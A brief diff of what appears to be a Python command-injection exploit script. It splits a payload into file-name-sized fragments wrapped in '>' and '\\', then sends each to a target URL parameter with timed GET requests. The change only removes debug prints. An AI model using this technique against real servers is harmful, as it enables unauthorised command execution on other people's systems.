@@ -45,15 +45,12 @@ def craft_payload():
     for i in range(len(splited)):
         splited[i] = '>' + splited[i] + '\\'
 
-    
     splited.extend(payload_tail)
     payload.extend(splited)
-    print(payload)
 
 def send():
     for i in payload:
         r = requests.get(arguments.target + '=' + i)
-        print (i)
         sleep(0.3)
 
 if __name__ == "__main__":
